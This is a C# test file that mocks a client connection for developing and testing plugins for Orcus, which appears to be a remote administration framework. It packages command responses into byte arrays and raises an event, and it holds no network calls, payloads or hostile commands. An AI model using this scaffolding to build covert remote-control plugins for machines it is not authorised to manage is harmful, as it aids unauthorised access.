using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Core;
using Orcus.Shared.Data;

namespace OrcusPluginStudio.Core.Test.ClientVirtualisation
{
    public class ConnectionInfo : IConnectionInfo
    {
        public ConnectionInfo()
        {
            ToolBase = new ToolBase();
            ServerConnection = new ServerConnection();
        }

        public IClientInfo ClientInfo { get; }
        public ushort AdministrationId { get; } = 1;
        public IServerConnection ServerConnection { get; }
        public IToolBase ToolBase { get; }
        public FrameworkVersion FrameworkVersion { get; } = FrameworkVersion.NET45;

        public void CommandFailed(Command command, byte[] message)
        {
            var package = new List<byte>();
            package.AddRange(BitConverter.GetBytes(command.Identifier));
            package.Add((byte) Orcus.Shared.Communication.CommandResponse.Failed);
            package.AddRange(message);

            Response(package.ToArray(), ResponseType.CommandResponse);
        }

        public void CommandSucceed(Command command, byte[] data)
        {
            var package = new List<byte>();
            package.AddRange(BitConverter.GetBytes(command.Identifier));
            package.Add((byte) Orcus.Shared.Communication.CommandResponse.Successful);
            package.AddRange(data);

            Response(package.ToArray(), ResponseType.CommandResponse);
        }

        public void CommandWarning(Command command, byte[] data)
        {
            var package = new List<byte>();
            package.AddRange(BitConverter.GetBytes(command.Identifier));
            package.Add((byte) Orcus.Shared.Communication.CommandResponse.Warning);
            package.AddRange(data);

            Response(package.ToArray(), ResponseType.CommandResponse);
        }

        public void CommandResponse(Command command, byte[] data, PackageCompression packageCompression = PackageCompression.Auto)
        {
            var package = new List<byte>();
            package.AddRange(BitConverter.GetBytes(command.Identifier));
            package.AddRange(data);

            Response(package.ToArray(), ResponseType.CommandResponse, packageCompression);
        }

        public void Response(byte[] package, ResponseType responseType, PackageCompression packageCompression = PackageCompression.Auto)
        {
            if (responseType != ResponseType.CommandResponse)
                return;

            ResponseData?.Invoke(this, package);
        }

        public void UnsafeResponse(Command command, int length, Action<BinaryWriter> writerCall)
        {
        }

        public event EventHandler<byte[]> ResponseData;
        public IConnectionInitializer ConnectionInitializer { get; }
        public void UnsafeResponse(Command command, WriterCall writerCall)
        {
        }
    }
}